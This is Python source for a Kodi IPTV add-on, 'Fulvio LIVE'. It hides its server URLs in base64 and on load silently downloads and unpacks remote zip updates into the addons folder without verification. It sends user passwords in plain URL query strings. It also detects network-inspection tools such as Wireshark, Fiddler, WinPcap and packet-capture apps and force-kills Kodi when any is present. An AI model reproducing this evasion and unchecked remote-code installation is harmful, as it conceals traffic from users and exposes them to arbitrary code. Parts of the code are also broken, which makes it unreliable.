# -*- coding: utf-8 -*-
import urllib
import urllib2
import re
import os
import xbmcplugin
import xbmcgui
import xbmcaddon
import xbmcvfs
import traceback
import cookielib,base64
import zipfile
import time
import datetime
import shutil
import json
import xbmc
import sys  
import stat
import requests  
import cgi
import speedtest
import addenable
from BeautifulSoup import BeautifulStoneSoup, BeautifulSoup, BeautifulSOAP

# import sys  
# reload(sys)  
# sys.setdefaultencoding('utf8')

viewmode=None
try:
    from xml.sax.saxutils import escape
except: traceback.print_exc()
try:
    import json
except:
    import simplejson as json
import SimpleDownloader as downloader

tsdownloader=False
resolve_url=['180upload.com', 'allmyvideos.net', 'bestreams.net', 'clicknupload.com', 'cloudzilla.to', 'movshare.net', 'novamov.com', 'nowvideo.sx', 'videoweed.es', 'daclips.in', 'datemule.com', 'faststream.in', 'filehoot.com', 'filenuke.com', 'sharesix.com',  'plus.google.com', 'picasaweb.google.com', 'gorillavid.com', 'gorillavid.in', 'grifthost.com', 'hugefiles.net', 'ipithos.to', 'ishared.eu', 'kingfiles.net', 'mail.ru', 'my.mail.ru', 'videoapi.my.mail.ru', 'mightyupload.com', 'mooshare.biz', 'movdivx.com', 'movpod.net', 'movpod.in', 'movreel.com', 'mrfile.me', 'nosvideo.com', 'openload.io', 'played.to', 'bitshare.com', 'filefactory.com', 'k2s.cc', 'oboom.com', 'rapidgator.net', 'primeshare.tv', 'bitshare.com', 'filefactory.com', 'k2s.cc', 'oboom.com', 'rapidgator.net', 'sharerepo.com', 'stagevu.com', 'streamcloud.eu', 'thefile.me', 'thevideo.me', 'tusfiles.net', 'uploadc.com', 'zalaa.com', 'uploadrocket.net', 'uptobox.com', 'v-vids.com', 'veehd.com', 'vidbull.com', 'videomega.tv', 'vidplay.net', 'vidspot.net', 'vidto.me', 'vidzi.tv', 'vimeo.com', 'vk.com', 'vodlocker.com', 'xfileload.com', 'xvidstage.com', 'zettahost.tv']
g_ignoreSetResolved=['plugin.video.dramasonline','plugin.video.f4mTester','plugin.video.shahidmbcnet','plugin.video.SportsDevil','plugin.stream.vaughnlive.tv','plugin.video.ZemTV-shani']

class NoRedirection(urllib2.HTTPErrorProcessor):
   def http_response(self, request, response):
       return response
   https_response = http_response

REMOTE_DBG=False;
if REMOTE_DBG:
    # Make pydev debugger works for auto reload.
    # Note pydevd module need to be copied in XBMC\system\python\Lib\pysrc
    try:
        import pysrc.pydevd as pydevd
    # stdoutToServer and stderrToServer redirect stdout and stderr to eclipse console
        pydevd.settrace('localhost', stdoutToServer=True, stderrToServer=True)
    except ImportError:
        sys.stderr.write("Error: " +
            "You must add org.python.pydev.debug.pysrc to your PYTHONPATH.")
        sys.exit(1)

addon = xbmcaddon.Addon('plugin.video.fulviolive')
addon_version = addon.getAddonInfo('version')
profile = xbmc.translatePath(addon.getAddonInfo('profile').decode('utf-8'))
home = xbmc.translatePath(addon.getAddonInfo('path').decode('utf-8'))
favorites = os.path.join(profile, 'favorites')
history = os.path.join(profile, 'history')
REV = os.path.join(profile, 'list_revision')
icon = os.path.join(home, 'icon.png')
FANART = os.path.join(home, 'fanart.jpg')
source_fulvio = os.path.join(profile, 'source_fulvio')
source_list = os.path.join(profile, 'source_list')
source_list2 = os.path.join(profile, 'source_list2')
source_list3 = os.path.join(profile, 'source_list3')
source_list4 = os.path.join(profile, 'source_list4')
functions_dir = profile
indexhome='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhbXMzcmxlci9wREhPMHloUHFpejVSVDZpTm9mYy9tYXN0ZXIvaW5kZXgueG1s'
communityfiles = os.path.join(profile, 'LivewebTV')
downloader = downloader.SimpleDownloader()
debug = addon.getSetting('debug')
if os.path.exists(favorites)==True:
    FAV = open(favorites).read()
else: FAV = []

AddonID = 'plugin.video.fulviolive'
addonDir = addon.getAddonInfo('path').decode("utf-8")

addon_data_dir = os.path.join(xbmc.translatePath("special://userdata/addon_data" ).decode("utf-8"), AddonID)
if not os.path.exists(addon_data_dir):
    os.makedirs(addon_data_dir)

LOCAL_VERSION_FILE = os.path.join(os.path.join(addonDir), 'version.xml' )
REMOTE_VERSION_FILE = base64.decodestring('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhbXMzcmxlci9wREhPMHloUHFpejVSVDZpTm9mYy9tYXN0ZXIvdmVyc2lvbi54bWw=')
LOCAL_VERSION_FILE2 = os.path.join(os.path.join(addonDir), 'list.xml' )
REMOTE_VERSION_FILE2 = base64.decodestring('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhbXMzcmxlci9wREhPMHloUHFpejVSVDZpTm9mYy9tYXN0ZXIvbGlzdC54bWw=')

def HTMLEntitiesToUnicode(text):
    """Converts HTML entities to unicode.  For example '&amp;' becomes '&'."""
    text = unicode(BeautifulStoneSoup(text, convertEntities=BeautifulStoneSoup.ALL_ENTITIES))
    return text

def unicodeToHTMLEntities(text):
    """Converts unicode to HTML entities.  For example '&' becomes '&amp;'."""
    text = cgi.escape(text).encode('ascii', 'xmlcharrefreplace')
    return text

def ExtractAll(_in, _out):
    try:
        zin = zipfile.ZipFile(_in, 'r')
        zin.extractall(_out)
    except Exception, e:
        print str(e)
        return False
    return True

def write_file(file_name, file_contents):
    fh = None
    try:
        fh = open(file_name, "wb")
        fh.write(file_contents)
        return True
    except:
        return False
    finally:
        if fh is not None:
            fh.close()

def ReadFile(fileName):    
    try:
        f = open(fileName,'r')
        content = f.read().replace("\n\n", "\n")
        f.close()
    except:
        content = ""
    return content

def find_single_match(data,patron,index=0):
    try:
        matches = re.findall( patron , data , flags=re.DOTALL )
        return matches[index]
    except:
        return ""

percent = 0
def DownloaderClass(url,dest):
    dp = xbmcgui.DialogProgress()
    dp.create("Fulvio ZIP DOWNLOADER","Downloading File",url)
    urllib.urlretrieve(url,dest,lambda nb, bs, fs, url=url: _pbhook(nb,bs,fs,url,dp))
 
def DownloaderClass2(url,dest):
    urllib.urlretrieve(url,dest)

def _pbhook(numblocks, blocksize, filesize, url=None,dp=None):
    try:
        percent = min((numblocks*blocksize*100)/filesize, 100)
        dp.update(percent)
    except: 
        percent = 100
        dp.update(percent)
        time.sleep(20)
        dp.close()
    if dp.iscanceled(): 
        dp.close()

def killxbmc():
    myplatform = platform()
    print "Platform: " + str(myplatform)
    if myplatform == 'osx': # OSX
        print "############   try osx force close  #################"
        try: os.system('killall -9 XBMC')
        except: pass
        try: os.system('killall -9 Kodi')
        except: pass
    elif myplatform == 'linux': #Linux
        print "############   try linux force close  #################"
        try: os.system('killall XBMC')
        except: pass
        try: os.system('killall Kodi')
        except: pass
        try: os.system('killall -9 xbmc.bin')
        except: pass
        try: os.system('killall -9 kodi.bin')
        except: pass
    elif myplatform == 'android': # Android  
        print "############   try android force close  #################"
        try: os.system('adb shell am force-stop org.xbmc.kodi')
        except: pass
        try: os.system('adb shell am force-stop org.kodi')
        except: pass
        try: os.system('adb shell am force-stop org.xbmc.xbmc')
        except: pass
        try: os.system('adb shell am force-stop org.xbmc')
        except: pass        
    elif myplatform == 'windows': # Windows
        print "############   try windows force close  #################"
        try:
            os.system('@ECHO off')
            os.system('tskill XBMC.exe')
        except: pass
        try:
            os.system('@ECHO off')
            os.system('tskill Kodi.exe')
        except: pass
        try:
            os.system('@ECHO off')
            os.system('TASKKILL /im Kodi.exe /f')
        except: pass
        try:
            os.system('@ECHO off')
            os.system('TASKKILL /im XBMC.exe /f')
        except: pass
    else: #ATV
        print "############   try atv force close  #################"
        try: os.system('killall AppleTV')
        except: pass
        print "############   try raspbmc force close  #################" #OSMC / Raspbmc
        try: os.system('sudo initctl stop kodi')
        except: pass
        try: os.system('sudo initctl stop xbmc')
        except: pass

def platform():
    if xbmc.getCondVisibility('system.platform.android'):
        return 'android'
    elif xbmc.getCondVisibility('system.platform.linux'):
        return 'linux'
    elif xbmc.getCondVisibility('system.platform.windows'):
        return 'windows'
    elif xbmc.getCondVisibility('system.platform.osx'):
        return 'osx'
    elif xbmc.getCondVisibility('system.platform.atv2'):
        return 'atv2'
    elif xbmc.getCondVisibility('system.platform.ios'):
        return 'ios'

if not  os.path.exists(source_fulvio):
    write_file(source_fulvio  , '[{"url": "'+indexhome+'", "fanart": "http://oi65.tinypic.com/2s6vr7b.jpg", "title": "[COLOR red]Fulvio LIVE[/COLOR]"}]')
SOURCES = open(source_fulvio).read()
if not  os.path.exists(source_list):
    write_file(source_list  , '[]')
LIST = open(source_list).read()
if not  os.path.exists(source_list2):
    write_file(source_list2  , '[]')
LIST2 = open(source_list2).read()
if not  os.path.exists(source_list3):
    write_file(source_list3  , '[]')
LIST3 = open(source_list3).read()
if not  os.path.exists(source_list4):
    write_file(source_list4  , '[]')
LIST4 = open(source_list4).read()
if not  os.path.exists(favorites):
    write_file(favorites  , '[]')

def checkforupdates(url,loc,aut):
    import ziptools
    xbmc.log('Start check for updates')
    try:
        data = urllib2.urlopen(url).read()
        xbmc.log('read xml remote data:' )#+ data)
    except:
        data = ""
        xbmc.log('fail read xml remote data:' + url )
    try:
        f = open(loc,'r')
        data2 = f.read().replace("\n\n", "")
        f.close()
        xbmc.log('read xml local data:' )#+ data2)
    except:
        data2 = ""
        xbmc.log('fail read xml local data')

    version_publicada = find_single_match(data,"<version>([^<]+)</version>").strip()
    tag_publicada = find_single_match(data,"<tag>([^<]+)</tag>").strip()

    version_local = find_single_match(data2,"<version>([^<]+)</version>").strip()
    tag_local = find_single_match(data2,"<tag>([^<]+)</tag>").strip()

    dinamic_url = find_single_match(data,"<url>([^<]+)</url>").strip()
    try:
        numero_version_publicada = int(version_publicada)
        xbmc.log('number remote version:' + version_publicada)
        numero_version_local = int(version_local)
        xbmc.log('number local version:' + version_local)
    except:
        version_publicada = ""
        xbmc.log('number local version:' + version_local )
        xbmc.log('Check fail !@*')

    if version_publicada != "" and version_local != "":
        if (numero_version_publicada > numero_version_local):
            AddonID = 'plugin.video.fulviolive'
            addon       = xbmcaddon.Addon(AddonID)
            addonname   = addon.getAddonInfo('name')
            extpath = os.path.join(xbmc.translatePath("special://home/addons/").decode("utf-8")) 
            addon_data_dir = os.path.join(xbmc.translatePath("special://userdata/addon_data" ).decode("utf-8"), AddonID) 
            dest = addon_data_dir + '/lastupdate.zip'                
            UPDATE_URL = dinamic_url
            xbmc.log('START DOWNLOAD UPDATE:' )#+ UPDATE_URL)
            DownloaderClass(UPDATE_URL,dest)  
            import ziptools
            unzipper = ziptools.ziptools()
            unzipper.extract(dest,extpath)
            line1 = 'New version installed .....'
            line2 = 'Version: ' + tag_publicada 
            xbmcgui.Dialog().ok('Fulvio LIVE', line1, line2)
                
            if os.remove( dest ): 
                xbmc.log('TEMPORARY ZIP REMOVED')
            xbmc.executebuiltin("UpdateLocalAddons")
            xbmc.executebuiltin("UpdateAddonRepos")

    url = REMOTE_VERSION_FILE2
    loc = LOCAL_VERSION_FILE2
    try:
        data = urllib2.urlopen(url).read()
        xbmc.log('read xml remote data:' )#+ data)
    except:
        data = ""
        xbmc.log('fail read xml remote data:' + url )
    try:
        f = open(loc,'r')
        data2 = f.read().replace("\n\n", "")
        f.close()
        xbmc.log('read xml local data:' )#+ data2)
    except:
        data2 = ""
        xbmc.log('fail read xml local data')
            
    version_publicada = find_single_match(data,"<version>([^<]+)</version>").strip()
    version_local = find_single_match(data2,"<version>([^<]+)</version>").strip()
    dinamic_url = find_single_match(data,"<url>([^<]+)</url>").strip()
        
    try:
        numero_version_publicada = int(version_publicada)
        xbmc.log('number remote version:' + version_publicada)
        numero_version_local = int(version_local)
        xbmc.log('number local version:' + version_local)
    except:
        version_publicada = ""
        xbmc.log('number local version:' + version_local )
        xbmc.log('Check fail !@*')
        u = True
            
    if version_publicada!="" and version_local!="":
        if (numero_version_publicada > numero_version_local):
            AddonID = 'plugin.video.fulviolive'
            addon_data_dir = os.path.join(xbmc.translatePath("special://userdata/addon_data" ).decode("utf-8"), AddonID) 
            extpath = os.path.join(xbmc.translatePath("special://home/addons/")) 
            dest = addon_data_dir + '/temp.zip'  
                    
            urllib.urlretrieve(dinamic_url,dest)
            xbmc.log('START DOWNLOAD PARTIAL UPDATE:' )#+ dinamic_url) 
                    
            import ziptools
            unzipper = ziptools.ziptools()
            unzipper.extract(dest,extpath)
                    
                   
            if os.remove( dest ): 
                xbmc.log('TEMPORARY ZIP REMOVED')
            xbmc.executebuiltin("UpdateLocalAddons")
            xbmc.executebuiltin("UpdateAddonRepos")
            u = False
        else:
            xbmc.log('No partial updates are available' )
            u = True

    if aut < 1 and u:
        AddonID = 'plugin.video.fulviolive'
        addon = xbmcaddon.Addon(AddonID)
        addonname = addon.getAddonInfo('name')
        icon = xbmcaddon.Addon(AddonID).getAddonInfo('icon')
        xbmc.executebuiltin('Notification(%s, %s, %d, %s)'%(addonname,"Check updates: no update is available", 3200, icon))
        xbmc.log('Check updates:No updates are available' )
    
Tfile = os.path.join(addon_data_dir, 'time.txt')
if os.path.isfile(Tfile):
        t = time.time() - os.path.getmtime(Tfile)
        if t > 5000 :
            checkforupdates(REMOTE_VERSION_FILE, LOCAL_VERSION_FILE,0)
            write_file(Tfile , '*')
else: 
    checkforupdates(REMOTE_VERSION_FILE, LOCAL_VERSION_FILE,0)
    write_file(Tfile  , '*')

def RestoreRepo(file):
    file = os.path.join(addon_data_dir, 'source_fulvio')
    if xbmcvfs.exists(file):
        success = xbmcvfs.delete(file)
        dialog = xbmcgui.Dialog()
        if success:
            dialog.notification('Fulvio Repository', file, xbmcgui.NOTIFICATION_INFO, 3000)
        else:
            dialog.notification('Fulvio Repository', file, xbmcgui.NOTIFICATION_ERROR, 3000)

def LoginFulvio(url=None):
        if url is None:
            if addon.getSetting(id="username") == "":
               source_url = addon.getSetting(id="username").decode('utf-8')

            username = addon.getSetting( id="username")
            password = addon.getSetting( id="password")
            source_url = base64.decodestring('aHR0cHM6Ly9pcHR2c2hhcmUucHcvMXk5d2g2WG0vbG9naW4ucGhw') + base64.decodestring('P3VzZXI9') + username + base64.decodestring('JnBhc3M9') + password + base64.decodestring('JnN1Ym1pdD1sb2dpbg==')

        else:
            source_url == ''
        if source_url == '' or source_url is None:
            return
        addon_log('Adding New Source: '+source_url.encode('utf-8'))

        media_info = None
        #print 'source_url',source_url
        # data = getSoup(source_url)
                
        # if isinstance(data,BeautifulSOAP):
            # if data.find('channels_info'):
                # media_info = data.channels_info
            # elif data.find('items_info'):
                # media_info = data.items_info
        if media_info:
            source_media = {}
            source_media['url'] = base64.b64encode(source_url)
            try: source_media['title'] = media_info.title.string
            except: pass
            try: source_media['thumbnail'] = media_info.thumbnail.string
            except: pass
            try: source_media['fanart'] = media_info.fanart.string
            except: pass
            try: source_media['genre'] = media_info.genre.string
            except: pass
            try: source_media['description'] = media_info.description.string
            except: pass
            try: source_media['date'] = media_info.date.string
            except: pass
            try: source_media['credits'] = media_info.credits.string
            except: pass
        else:
            if username in source_url:
                nameStr = "[COLOR lime]Fulvio LIVE[/COLOR] [COLOR hotpink]3[/COLOR]: [COLOR white]"+ username +"[/COLOR]"
            # if '\\' in source_url:
                # nameStr = source_url.split('\\')[-1].split('.')[0]
            # if '%' in nameStr:
                # nameStr = urllib.unquote_plus(nameStr)
            # keyboard = xbmc.Keyboard(nameStr,'Displayed Name, Rename?')
            # keyboard.doModal()
            # if (keyboard.isConfirmed() == False):
                # return
            newStr = nameStr #keyboard.getText()
            # if len(newStr) == 0:
                # return
            source_media = {}
            source_media['title'] = newStr
            source_media['url'] = base64.b64encode(source_url)
            source_media['fanart'] = fanart
        source_fulvio = os.path.join(profile, 'source_fulvio')
        if os.path.exists(source_fulvio)==False:
            source_fulvio = []
            source_fulvio.append(source_media)
            b = open(source_fulvio,"w")
            b.write(json.dumps(source_fulvio))
            b.close()
        else:
            sources = json.loads(open(source_fulvio,"r").read())
            sources.append(source_media)
            b = open(source_fulvio,"w")
            b.write(json.dumps(sources))
            b.close()
        addon.setSetting('new_url_source', "")
        addon.setSetting('new_file_source', "")
        xbmc.executebuiltin("XBMC.Notification(Fulvio,New source added.,5000,"+icon+")")
        xbmc.executebuiltin("XBMC.Container.Refresh")
        # if not url is None:
            # if 'xbmcplus.xb.funpic.de' in url:
                # xbmc.executebuiltin("XBMC.Container.Update(%s?mode=14,replace)" %sys.argv[0])
            # elif 'community-links' in url:
                # xbmc.executebuiltin("XBMC.Container.Update(%s?mode=10,replace)" %sys.argv[0])
        # else: addon.openSettings()

def LoginFulvio2(url=None):
        if url is None:
            if addon.getSetting(id="username") == "":
               source_url = addon.getSetting(id="username").decode('utf-8')

            username = addon.getSetting( id="username")
            password = addon.getSetting( id="password")
            source_url = base64.decodestring('aHR0cHM6Ly9pcHR2c2hhcmUucHcvMnhkUjRIaE5KL2xvZ2luLnBocA==') + base64.decodestring('P3VzZXI9') + username + base64.decodestring('JnBhc3M9') + password + base64.decodestring('JnN1Ym1pdD1sb2dpbg==')

        else:
            source_url == ''
        if source_url == '' or source_url is None:
            return
        addon_log('Adding New Source: '+source_url.encode('utf-8'))

        media_info = None
        #print 'source_url',source_url
        # data = getSoup(source_url)
                
        # if isinstance(data,BeautifulSOAP):
            # if data.find('channels_info'):
                # media_info = data.channels_info
            # elif data.find('items_info'):
                # media_info = data.items_info
        if media_info:
            source_media = {}
            source_media['url'] = base64.b64encode(source_url)
            try: source_media['title'] = media_info.title.string
            except: pass
            try: source_media['thumbnail'] = media_info.thumbnail.string
            except: pass
            try: source_media['fanart'] = media_info.fanart.string
            except: pass
            try: source_media['genre'] = media_info.genre.string
            except: pass
            try: source_media['description'] = media_info.description.string
            except: pass
            try: source_media['date'] = media_info.date.string
            except: pass
            try: source_media['credits'] = media_info.credits.string
            except: pass
        else:
            if username in source_url:
                nameStr = "[COLOR lime]Fulvio LIVE[/COLOR] [COLOR hotpink]2[/COLOR]: [COLOR white]"+ username +"[/COLOR]"
            # if '\\' in source_url:
                # nameStr = source_url.split('\\')[-1].split('.')[0]
            # if '%' in nameStr:
                # nameStr = urllib.unquote_plus(nameStr)
            # keyboard = xbmc.Keyboard(nameStr,'Displayed Name, Rename?')
            # keyboard.doModal()
            # if (keyboard.isConfirmed() == False):
                # return
            newStr = nameStr #keyboard.getText()
            # if len(newStr) == 0:
                # return
            source_media = {}
            source_media['title'] = newStr
            source_media['url'] = base64.b64encode(source_url)
            source_media['fanart'] = fanart
        source_fulvio = os.path.join(profile, 'source_fulvio')
        if os.path.exists(source_fulvio)==False:
            source_fulvio = []
            source_fulvio.append(source_media)
            b = open(source_fulvio,"w")
            b.write(json.dumps(source_fulvio))
            b.close()
        else:
            sources = json.loads(open(source_fulvio,"r").read())
            sources.append(source_media)
            b = open(source_fulvio,"w")
            b.write(json.dumps(sources))
            b.close()
        addon.setSetting('new_url_source', "")
        addon.setSetting('new_file_source', "")
        xbmc.executebuiltin("XBMC.Notification(Fulvio,New source added.,5000,"+icon+")")
        xbmc.executebuiltin("XBMC.Container.Refresh")
        # if not url is None:
            # if 'xbmcplus.xb.funpic.de' in url:
                # xbmc.executebuiltin("XBMC.Container.Update(%s?mode=14,replace)" %sys.argv[0])
            # elif 'community-links' in url:
                # xbmc.executebuiltin("XBMC.Container.Update(%s?mode=10,replace)" %sys.argv[0])
        # else: addon.openSettings()

def LoginFulvio3(url=None):
        if url is None:
            if addon.getSetting(id="username") == "":
               source_url = addon.getSetting(id="username").decode('utf-8')

            username = addon.getSetting( id="username")
            password = addon.getSetting( id="password")
            source_url = base64.decodestring('aHR0cHM6Ly9pcHR2c2hhcmUucHcvM3dWSnhiN2k0L2xvZ2luLnBocA==') + base64.decodestring('P3VzZXI9') + username + base64.decodestring('JnBhc3M9') + password + base64.decodestring('JnN1Ym1pdD1sb2dpbg==')

        else:
            source_url == ''
        if source_url == '' or source_url is None:
            return
        addon_log('Adding New Source: '+source_url.encode('utf-8'))

        media_info = None
        #print 'source_url',source_url
        # data = getSoup(source_url)
                
        # if isinstance(data,BeautifulSOAP):
            # if data.find('channels_info'):
                # media_info = data.channels_info
            # elif data.find('items_info'):
                # media_info = data.items_info
        if media_info:
            source_media = {}
            source_media['url'] = base64.b64encode(source_url)
            try: source_media['title'] = media_info.title.string
            except: pass
            try: source_media['thumbnail'] = media_info.thumbnail.string
            except: pass
            try: source_media['fanart'] = media_info.fanart.string
            except: pass
            try: source_media['genre'] = media_info.genre.string
            except: pass
            try: source_media['description'] = media_info.description.string
            except: pass
            try: source_media['date'] = media_info.date.string
            except: pass
            try: source_media['credits'] = media_info.credits.string
            except: pass
        else:
            if username in source_url:
                nameStr = "[COLOR lime]Fulvio LIVE[/COLOR] [COLOR hotpink]1[/COLOR]: [COLOR white]"+ username +"[/COLOR]"
            # if '\\' in source_url:
                # nameStr = source_url.split('\\')[-1].split('.')[0]
            # if '%' in nameStr:
                # nameStr = urllib.unquote_plus(nameStr)
            # keyboard = xbmc.Keyboard(nameStr,'Displayed Name, Rename?')
            # keyboard.doModal()
            # if (keyboard.isConfirmed() == False):
                # return
            newStr = nameStr #keyboard.getText()
            # if len(newStr) == 0:
                # return
            source_media = {}
            source_media['title'] = newStr
            source_media['url'] = base64.b64encode(source_url)
            source_media['fanart'] = fanart
        source_fulvio = os.path.join(profile, 'source_fulvio')
        if os.path.exists(source_fulvio)==False:
            source_fulvio = []
            source_fulvio.append(source_media)
            b = open(source_fulvio,"w")
            b.write(json.dumps(source_fulvio))
            b.close()
        else:
            sources = json.loads(open(source_fulvio,"r").read())
            sources.append(source_media)
            b = open(source_fulvio,"w")
            b.write(json.dumps(sources))
            b.close()
        addon.setSetting('new_url_source', "")
        addon.setSetting('new_file_source', "")
        xbmc.executebuiltin("XBMC.Notification(Fulvio,New source added.,5000,"+icon+")")
        xbmc.executebuiltin("XBMC.Container.Refresh")
        # if not url is None:
            # if 'xbmcplus.xb.funpic.de' in url:
                # xbmc.executebuiltin("XBMC.Container.Update(%s?mode=14,replace)" %sys.argv[0])
            # elif 'community-links' in url:
                # xbmc.executebuiltin("XBMC.Container.Update(%s?mode=10,replace)" %sys.argv[0])
        # else: addon.openSettings()

def rmlogin(url):
        sources = json.loads(open(source_fulvio,"r").read())
        for index in range(len(sources)):
            if isinstance(sources[index], list):
                if sources[index][0] == base64.b64encode(url):
                    del sources[index]
                    b = open(source_fulvio,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
            else:
                if sources[index]['url'] == base64.b64encode(url):
                    del sources[index]
                    b = open(source_fulvio,"w")
                    b.write(json.dumps(sources))
                    b.close()
                    break
        xbmc.executebuiltin("XBMC.Container.Refresh")

oslinux = os.path.expanduser("/usr/bin/wireshark")
if os.path.exists(oslinux):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()

oslinux = os.path.expanduser("/usr/bin/kismet")
if os.path.exists(oslinux):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()

oslinux = os.path.expanduser("/usr/bin/etterfilter")
if os.path.exists(oslinux):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()

osandroid = os.path.expanduser("/data/data/lv.n3o.shark")
if os.path.exists(osandroid):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()
    xbmc.executebuiltin('XBMC.RestartApp()')

osandroid = os.path.expanduser("/data/data/app.greyshirts.sslcapture")
if os.path.exists(osandroid):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()
    xbmc.executebuiltin('XBMC.RestartApp()')

oswindows = os.path.expanduser("C:\Program Files (x86)\Wireshark")
if os.path.exists(oswindows):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()
    xbmc.executebuiltin('XBMC.RestartApp()')

oswindows = os.path.expanduser("C:\Program Files\Wireshark")
if os.path.exists(oswindows):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()
    xbmc.executebuiltin('XBMC.RestartApp()')

oswindows = os.path.expanduser("C:\Program Files (x86)\URLSnooper2")
if os.path.exists(oswindows):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()
    xbmc.executebuiltin('XBMC.RestartApp()')
 
oswindows = os.path.expanduser("C:\Program Files\URLSnooper2")
if os.path.exists(oswindows):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()
    xbmc.executebuiltin('XBMC.RestartApp()')

oswindows = os.path.expanduser("C:\Program Files\WinPcap")
if os.path.exists(oswindows):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()
    xbmc.executebuiltin('XBMC.RestartApp()')

oswindows = os.path.expanduser("C:\Program Files (x86)\WinPcap")
if os.path.exists(oswindows):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()
    xbmc.executebuiltin('XBMC.RestartApp()')

oswindows = os.path.expanduser("C:\Program Files (x86)\Fiddler2")
if os.path.exists(oswindows):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()
    xbmc.executebuiltin('XBMC.RestartApp()')

oswindows = os.path.expanduser("C:\Program Files\Fiddler2")
if os.path.exists(oswindows):
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    killxbmc()
    xbmc.executebuiltin('XBMC.RestartApp()')

def addon_log(string):
    if debug == 'true':
        xbmc.log("[addon.fulvio.live-%s]: %s" %(addon_version, string))

def numeric(title = '', defaultText = ''):
    dialog = xbmcgui.Dialog()
    d = dialog.input(title, defaultText, type=xbmcgui.INPUT_NUMERIC)
    return d

def getSources():
        try:
            #if os.path.exists(favorites) == True:
            addDir('[B]  [COLOR white]Unisciti al canale di supporto[/COLOR] [COLOR lime]Telegram[/COLOR]  [COLOR blue]@fulviolive[/COLOR][/B]','url',None,os.path.join(home, 'icon.png'),FANART,'','','','',True)
            vers = addon.getAddonInfo('version')
            addDir('[B][COLOR gold]PREFERITI[/COLOR][/B]                                   [COLOR grey]Versione addon: '+vers+'[/COLOR]','url',4,os.path.join(home, 'icon.png'),FANART,'','','','',True)
            # if addon.getSetting("browse_xml_database") == "true":
                # addDir('XML Database','http://xbmcplus.xb.funpic.de/www-data/filesystem/',15,icon,FANART,'','','','')
            # if addon.getSetting("browse_community") == "true":
                # addDir('Community Files','community_files',16,icon,FANART,'','','','')
            # if addon.getSetting("searchotherplugins") == "true":
                # addDir('Search Other Plugins','Search Plugins',25,icon,FANART,'','','','')
            addDir('[B][COLOR lightblue]Aggiungi [COLOR lawngreen]XML[/COLOR] o [COLOR lawngreen]M3U[/COLOR] o [COLOR orange]SCAN m3u[/COLOR][/COLOR][/B]','url',7,os.path.join(home, 'icon.png'),FANART,'','','','',True)
            addDir('[B][COLOR lawngreen]RISORSE PERSONALI [/COLOR][/B]','url',500,os.path.join(home, 'icon.png'),FANART,'','','','',True)
            try:
                if os.path.exists(source_fulvio)==True:
                    sources = json.loads(open(source_fulvio,"r").read())
                    #print 'sources',sources
                    if len(sources) >= 1:
                        for i in sources:
                            try:
                                ## for pre 1.0.8 sources
                                if isinstance(i, list):
                                    addDir(i[0].encode('utf-8'),base64.b64decode(i[1]).encode('utf-8'),1,icon,FANART,'','','','','source')
                                else:
                                    thumb = icon
                                    fanart = FANART
                                    desc = ''
                                    date = ''
                                    credits = ''
                                    genre = ''
                                    if i.has_key('thumbnail'):
                                        thumb = i['thumbnail']
                                    if i.has_key('fanart'):
                                        fanart = i['fanart']
                                    if i.has_key('description'):
                                        desc = i['description']
                                    if i.has_key('date'):
                                        date = i['date']
                                    if i.has_key('genre'):
                                        genre = i['genre']
                                    if i.has_key('credits'):
                                        credits = i['credits']
                                    addDir('[COLOR lightcyan]'+i['title']+'[/COLOR]',base64.b64decode(i['url']),1,thumb,fanart,desc,genre,date,credits,'source')
                            except: traceback.print_exc()
                    # else:
                        # if len(sources) == 1:
                            # if isinstance(sources[0], list):
                                # getData(sources[0][1].encode('utf-8'),FANART)
                            # else:
                                # getData(sources[0]['url'], sources[0]['fanart'])
            except:
                pass
            addDir('[B][COLOR cyan]RISORSE ESTERNE [/COLOR][/B]','url',502,os.path.join(home, 'icon.png'),FANART,'','','','','extres')
            addDir('[B][COLOR lime]TV[/COLOR] [COLOR lightblue]ONLINE[/COLOR][/B]','url',539,os.path.join(home, 'icon.png'),FANART,'','','','',True)
            addLink('http://streaming.radionomy.com/RFLNETWORK?lang=it-it','[B] > > > [COLOR powderblue] RADIO FULVIO LIVE [COLOR magenta]NETWORK[/COLOR] [/COLOR] < < < [/B]',os.path.join(home, 'icon.png'),FANART,'','','',True,None,'',1)

            addDir('[B][COLOR yellow]ADDON necessari [/COLOR][/B]','url',517,os.path.join(home, 'icon.png'),FANART,'','','','',True)
            addDir('[B][COLOR salmon]SpeedTest [/COLOR][/B]','http://speedtest.tele2.net/100MB.zip',603,os.path.join(home, 'icon.png'),FANART,'','','','',True)

            dir = os.path.join(xbmc.translatePath("special://home"),"userdata")
            nfile = 'playercorefactory.xml'
            file = os.path.join(dir, nfile)
            if os.path.isfile(file):
                name = '[COLOR lime]ON[/COLOR]'
                mode = 516
            else:
                name = '[COLOR red]OFF[/COLOR]'
                mode = 515
